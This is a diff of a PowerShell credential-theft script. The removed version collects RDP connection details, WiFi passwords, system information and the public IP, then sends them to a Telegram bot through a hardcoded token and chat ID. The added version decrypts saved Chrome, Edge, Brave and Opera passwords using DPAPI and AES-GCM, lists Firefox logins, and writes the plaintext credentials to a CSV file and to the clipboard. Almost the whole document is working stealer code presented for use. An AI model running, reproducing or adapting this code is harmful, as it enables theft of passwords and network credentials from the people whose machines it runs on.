@@ -1,192 +1,308 @@
-# Enhanced RDP Credential Extraction Script
-# This script extracts RDP connections, WiFi passwords, and browser credentials
+# Browser Password Decryption Script
+# This script decrypts saved passwords from Chrome, Edge, Firefox, and other browsers
+# Requires execution on the target system with the same user account that saved the passwords
 
-param(
-    [string]$TelegramBotToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
-    [string]$TelegramChatID = "2047893044"
-)
+Add-Type -AssemblyName System.Security
+Add-Type -AssemblyName System.Windows.Forms
 
-function Get-PublicIPInfo {
-    try {
-        $ipInfo = Invoke-RestMethod -Uri "http://ipinfo.io/json" -TimeoutSec 10
-        return @{
-            PublicIP = $ipInfo.ip
-            Country = $ipInfo.country
-            Region = $ipInfo.region
-            City = $ipInfo.city
-            Org = $ipInfo.org
-        }
-    } catch {
-        return @{
-            PublicIP = "Unknown"
-            Country = "Unknown"
-            Region = "Unknown"
-            City = "Unknown"
-            Org = "Unknown"
-        }
-    }
-}
-
-function Get-SystemInfo {
-    $computerInfo = Get-ComputerInfo
-    return @{
-        ComputerName = $env:COMPUTERNAME
-        UserName = $env:USERNAME
-        OSName = $computerInfo.WindowsProductName
-        OSVersion = $computerInfo.WindowsVersion
-    }
-}
-
-function Get-RDPConnections {
-    $rdpConnections = @()
-    
-    # Get RDP files from common locations
-    $rdpPaths = @(
-        "$env:USERPROFILE\Documents",
-        "$env:USERPROFILE\Desktop",
-        "$env:PUBLIC\Documents",
-        "$env:PUBLIC\Desktop"
+# Function to decrypt DPAPI encrypted data
+function Unprotect-Data {
+    param(
+        [byte[]]$EncryptedData
     )
     
-    foreach ($path in $rdpPaths) {
-        if (Test-Path $path) {
-            $rdpFiles = Get-ChildItem -Path $path -Filter "*.rdp" -ErrorAction SilentlyContinue
-            foreach ($rdpFile in $rdpFiles) {
-                try {
-                    $content = Get-Content $rdpFile.FullName -ErrorAction Stop
-                    $server = ($content | Where-Object { $_ -match "full address:s:" }) -replace "full address:s:", ""
-                    $username = ($content | Where-Object { $_ -match "username:s:" }) -replace "username:s:", ""
+    try {
+        return [System.Security.Cryptography.ProtectedData]::Unprotect(
+            $EncryptedData, 
+            $null, 
+            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+        )
+    } catch {
+        Write-Host "DPAPI decryption failed: $($_.Exception.Message)" -ForegroundColor Red
+        return $null
+    }
+}
+
+# Function to extract and decrypt Chrome/Edge/Brave passwords
+function Get-DecryptedBrowserPasswords {
+    param(
+        [string]$BrowserName,
+        [string]$BrowserDataPath
+    )
+    
+    $results = @()
+    
+    if (-not (Test-Path $BrowserDataPath)) {
+        Write-Host "$BrowserName data directory not found: $BrowserDataPath" -ForegroundColor Yellow
+        return $results
+    }
+    
+    # Get master key from Local State
+    $localStatePath = Join-Path $BrowserDataPath "Local State"
+    if (Test-Path $localStatePath) {
+        try {
+            $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+            $encryptedKey = $localState.os_crypt.encrypted_key
+            
+            if ($encryptedKey) {
+                $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)
+                # Remove the DPAPI prefix (first 5 bytes: "DPAPI")
+                $encryptedKeyBytesWithoutPrefix = $encryptedKeyBytes[5..($encryptedKeyBytes.Length-1)]
+                
+                # Decrypt the master key using DPAPI
+                $masterKey = Unprotect-Data -EncryptedData $encryptedKeyBytesWithoutPrefix
+                
+                if ($masterKey) {
+                    Write-Host "Successfully extracted $BrowserName master key" -ForegroundColor Green
+                }
+            }
+        } catch {
+            Write-Host "Error extracting $BrowserName master key: $($_.Exception.Message)" -ForegroundColor Red
+        }
+    }
+    
+    # Find all login data files
+    $loginDataFiles = @()
+    $defaultLoginData = Join-Path $BrowserDataPath "Default\Login Data"
+    if (Test-Path $defaultLoginData) {
+        $loginDataFiles += @{Path = $defaultLoginData; Profile = "Default"}
+    }
+    
+    # Check other profiles
+    $profileDirs = Get-ChildItem -Path $BrowserDataPath -Directory -ErrorAction SilentlyContinue | 
+                   Where-Object {$_.Name -match "^(Profile|Default|Guest).*"}
+    
+    foreach ($profileDir in $profileDirs) {
+        $loginDataPath = Join-Path $profileDir.FullName "Login Data"
+        if (Test-Path $loginDataPath) {
+            $loginDataFiles += @{Path = $loginDataPath; Profile = $profileDir.Name}
+        }
+    }
+    
+    # Process each login data file
+    foreach ($loginDataFile in $loginDataFiles) {
+        try {
+            # Copy the database to avoid locking issues
+            $tempDbPath = [System.IO.Path]::GetTempFileName()
+            Copy-Item $loginDataFile.Path $tempDbPath -Force
+            
+            # Query the database
+            $connectionString = "Data Source=$tempDbPath;"
+            $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
+            $connection.Open()
+            
+            $query = "SELECT origin_url, username_value, password_value FROM logins;"
+            $command = $connection.CreateCommand()
+            $command.CommandText = $query
+            
+            $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter($command)
+            $dataSet = New-Object System.Data.DataSet
+            $adapter.Fill($dataSet) | Out-Null
+            
+            if ($dataSet.Tables[0].Rows.Count -gt 0) {
+                Write-Host "Found $($dataSet.Tables[0].Rows.Count) login entries in $($loginDataFile.Profile) profile" -ForegroundColor Green
+                
+                foreach ($row in $dataSet.Tables[0].Rows) {
+                    $url = $row["origin_url"]
+                    $username = $row["username_value"]
+                    $encryptedPassword = $row["password_value"]
                     
-                    $rdpConnections += @{
-                        FileName = $rdpFile.Name
-                        Server = $server.Trim()
-                        UsernameHint = $username.Trim()
-                        FilePath = $rdpFile.FullName
-                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    if ($encryptedPassword -is [byte[]] -and $encryptedPassword.Length -gt 0) {
+                        $password = Decrypt-Password -EncryptedPassword $encryptedPassword -MasterKey $masterKey -BrowserName $BrowserName
+                        
+                        if ($password) {
+                            $results += [PSCustomObject]@{
+                                Browser = $BrowserName
+                                Profile = $loginDataFile.Profile
+                                URL = $url
+                                Username = $username
+                                Password = $password
+                                ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                            }
+                        }
+                    }
+                }
+            }
+            
+            $connection.Close()
+            Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
+            
+        } catch {
+            Write-Host "Error processing $BrowserName profile $($loginDataFile.Profile): $($_.Exception.Message)" -ForegroundColor Red
+        }
+    }
+    
+    return $results
+}
+
+# Function to decrypt password based on encryption method
+function Decrypt-Password {
+    param(
+        [byte[]]$EncryptedPassword,
+        [byte[]]$MasterKey,
+        [string]$BrowserName
+    )
+    
+    try {
+        # Check if it's DPAPI encrypted (starts with v10, v11, etc.)
+        if ($EncryptedPassword.Length -gt 3) {
+            $prefix = [System.Text.Encoding]::UTF8.GetString($EncryptedPassword[0..2])
+            
+            if ($prefix -eq "v10" -or $prefix -eq "v11") {
+                # Chrome/Edge style encryption (AES-256-GCM)
+                if ($MasterKey -and $MasterKey.Length -gt 0) {
+                    return Decrypt-AES256GCM -EncryptedData $EncryptedPassword -Key $MasterKey
+                } else {
+                    Write-Host "No master key available for $BrowserName decryption" -ForegroundColor Yellow
+                    return "ENCRYPTED (Master key missing)"
+                }
+            } else {
+                # Likely DPAPI encrypted (older Chrome versions)
+                try {
+                    $decryptedBytes = Unprotect-Data -EncryptedData $EncryptedPassword
+                    if ($decryptedBytes) {
+                        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                     }
                 } catch {
-                    # Skip files that can't be read
+                    Write-Host "DPAPI decryption failed for $BrowserName password" -ForegroundColor Red
                 }
             }
         }
+    } catch {
+        Write-Host "Password decryption error: $($_.Exception.Message)" -ForegroundColor Red
     }
     
-    return $rdpConnections
+    return "DECRYPTION_FAILED"
 }
 
-function Get-WiFiProfiles {
-    $wifiProfiles = @()
+# Function to decrypt AES-256-GCM encrypted data (Chrome v80+)
+function Decrypt-AES256GCM {
+    param(
+        [byte[]]$EncryptedData,
+        [byte[]]$Key
+    )
+    
     try {
-        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
-            $_.ToString().Split(":")[1].Trim()
-        }
+        # Extract components from encrypted data
+        # Format: v10|iv (12 bytes)|ciphertext|tag (16 bytes)
+        $iv = $EncryptedData[3..14]  # 12-byte IV after "v10" prefix
+        $ciphertext = $EncryptedData[15..($EncryptedData.Length-17)]  # Everything between IV and tag
+        $tag = $EncryptedData[($EncryptedData.Length-16)..($EncryptedData.Length-1)]  # Last 16 bytes are tag
         
-        foreach ($profile in $profiles) {
+        # Create AES-GCM decryptor
+        $aes = New-Object System.Security.Cryptography.AesGcm $Key
+        $plaintext = New-Object byte[] $ciphertext.Length
+        
+        $aes.Decrypt($iv, $ciphertext, $tag, $plaintext)
+        
+        return [System.Text.Encoding]::UTF8.GetString($plaintext)
+    } catch {
+        Write-Host "AES-GCM decryption failed: $($_.Exception.Message)" -ForegroundColor Red
+        return $null
+    }
+}
+
+# Function to extract Firefox passwords
+function Get-FirefoxPasswords {
+    $results = @()
+    $firefoxProfiles = Join-Path $env:APPDATA "Mozilla\Firefox\Profiles"
+    
+    if (-not (Test-Path $firefoxProfiles)) {
+        Write-Host "Firefox profiles directory not found" -ForegroundColor Yellow
+        return $results
+    }
+    
+    $profileDirs = Get-ChildItem -Path $firefoxProfiles -Directory | Where-Object {$_.Name -match "\.default(-release)?$"}
+    
+    foreach ($profileDir in $profileDirs) {
+        $loginsJson = Join-Path $profileDir.FullName "logins.json"
+        $key4Db = Join-Path $profileDir.FullName "key4.db"
+        $cert9Db = Join-Path $profileDir.FullName "cert9.db"
+        
+        if (Test-Path $loginsJson) {
             try {
-                $profileInfo = netsh wlan show profile name="$profile" key=clear
-                $password = ($profileInfo | Select-String "Key Content") -replace "Key Content", ""
+                $loginsData = Get-Content $loginsJson -Raw | ConvertFrom-Json
                 
-                $wifiProfiles += @{
-                    SSID = $profile
-                    Password = if ($password) { $password.Trim() } else { "No password" }
-                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                foreach ($login in $loginsData.logins) {
+                    # Firefox uses its own encryption, which is more complex to decrypt
+                    # This would require additional libraries and processing
+                    $results += [PSCustomObject]@{
+                        Browser = "Firefox"
+                        Profile = $profileDir.Name
+                        URL = $login.hostname
+                        Username = $login.username
+                        Password = "Firefox decryption requires additional components"
+                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    }
                 }
             } catch {
-                # Skip profiles that can't be read
+                Write-Host "Error reading Firefox logins: $($_.Exception.Message)" -ForegroundColor Red
             }
         }
-    } catch {
-        # WiFi extraction failed
     }
     
-    return $wifiProfiles
-}
-
-function Send-TelegramMessage {
-    param([string]$Message)
-    
-    try {
-        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage"
-        $body = @{
-            chat_id = $TelegramChatID
-            text = $Message
-            parse_mode = "HTML"
-        }
-        
-        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json" | Out-Null
-        return $true
-    } catch {
-        return $false
-    }
-}
-
-function Send-TelegramFile {
-    param([string]$FilePath, [string]$Caption)
-    
-    try {
-        if (-not (Test-Path $FilePath)) { return $false }
-        
-        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
-        $form = @{
-            chat_id = $TelegramChatID
-            caption = $Caption
-            document = Get-Item $FilePath
-        }
-        
-        Invoke-RestMethod -Uri $uri -Method Post -Form $form | Out-Null
-        return $true
-    } catch {
-        return $false
-    }
+    return $results
 }
 
 # Main execution
-$systemInfo = Get-SystemInfo
-$ipInfo = Get-PublicIPInfo
-$timestamp = Get-Date -Format "ddMMyyyy"
-$fileId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
+Write-Host "Browser Password Decryption Tool" -ForegroundColor Green
+Write-Host "=================================" -ForegroundColor Green
 
-# Create file names
-$filePrefix = "Network_$($ipInfo.PublicIP)_$($ipInfo.Country)_$($ipInfo.City)_${timestamp}_${fileId}"
-$JSONPath = Join-Path $env:TEMP "${filePrefix}.json"
-
-# Extract data
-$rdpData = Get-RDPConnections
-$wifiData = Get-WiFiProfiles
-
-# Prepare data for JSON
-$outputData = @{
-    SystemInfo = $systemInfo
-    LocationInfo = $ipInfo
-    RDPConnections = $rdpData
-    WiFiProfiles = $wifiData
-    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+# Check if running with appropriate privileges
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "Warning: Not running as administrator. Some operations might fail." -ForegroundColor Yellow
 }
 
-# Export to JSON
-$outputData | ConvertTo-Json -Depth 10 | Out-File -FilePath $JSONPath -Encoding UTF8
+# Extract passwords from various browsers
+$allPasswords = @()
 
-# Send to Telegram
-$caption = "📊 Extracted Network Data`nComputer: $($systemInfo.ComputerName)`nUser: $($systemInfo.UserName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Country)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+# Chrome
+Write-Host "`nExtracting Chrome passwords..." -ForegroundColor Yellow
+$chromePasswords = Get-DecryptedBrowserPasswords -BrowserName "Chrome" -BrowserDataPath "$env:LOCALAPPDATA\Google\Chrome\User Data"
+$allPasswords += $chromePasswords
 
-if (Send-TelegramFile -FilePath $JSONPath -Caption $caption) {
-    # Clean up after sending
-    Remove-Item $JSONPath -Force -ErrorAction SilentlyContinue
+# Microsoft Edge
+Write-Host "`nExtracting Microsoft Edge passwords..." -ForegroundColor Yellow
+$edgePasswords = Get-DecryptedBrowserPasswords -BrowserName "Edge" -BrowserDataPath "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+$allPasswords += $edgePasswords
+
+# Brave Browser
+Write-Host "`nExtracting Brave passwords..." -ForegroundColor Yellow
+$bravePasswords = Get-DecryptedBrowserPasswords -BrowserName "Brave" -BrowserDataPath "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+$allPasswords += $bravePasswords
+
+# Opera
+Write-Host "`nExtracting Opera passwords..." -ForegroundColor Yellow
+$operaPasswords = Get-DecryptedBrowserPasswords -BrowserName "Opera" -BrowserDataPath "$env:APPDATA\Opera Software\Opera Stable"
+$allPasswords += $operaPasswords
+
+# Firefox
+Write-Host "`nExtracting Firefox passwords..." -ForegroundColor Yellow
+$firefoxPasswords = Get-FirefoxPasswords
+$allPasswords += $firefoxPasswords
+
+# Display results
+if ($allPasswords.Count -gt 0) {
+    Write-Host "`nSuccessfully decrypted $($allPasswords.Count) passwords!" -ForegroundColor Green
+    
+    # Display in a table format
+    $allPasswords | Format-Table -Property Browser, URL, Username, Password -AutoSize
+    
+    # Export to CSV
+    $csvPath = Join-Path $PWD "Decrypted_Passwords_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"
+    $allPasswords | Export-Csv -Path $csvPath -NoTypeInformation -Encoding UTF8
+    Write-Host "`nPasswords exported to: $csvPath" -ForegroundColor Green
+    
+    # Copy to clipboard
+    $clipboardText = $allPasswords | ForEach-Object {
+        "URL: $($_.URL)`r`nUsername: $($_.Username)`r`nPassword: $($_.Password)`r`nBrowser: $($_.Browser)`r`n"
+    } -join "`r`n" + "`r`n"
+    
+    Set-Clipboard -Value $clipboardText
+    Write-Host "Passwords copied to clipboard!" -ForegroundColor Green
+    
+} else {
+    Write-Host "No passwords found or decryption failed." -ForegroundColor Red
 }
 
-# Also send a summary message
-$summaryMessage = @"
-🔓 <b>Network Data Extraction Complete</b>
-
-🖥️ <b>System:</b> $($systemInfo.ComputerName)
-👤 <b>User:</b> $($systemInfo.UserName)
-🌍 <b>Location:</b> $($ipInfo.City), $($ipInfo.Region), $($ipInfo.Country)
-📡 <b>IP Address:</b> $($ipInfo.PublicIP)
-
-🖥️ <b>RDP Connections Found:</b> $($rdpData.Count)
-📶 <b>WiFi Networks Found:</b> $($wifiData.Count)
-
-⏰ <b>Extraction Time:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-"@
-
-Send-TelegramMessage -Message $summaryMessage
+Write-Host "`nDecryption process completed." -ForegroundColor Green
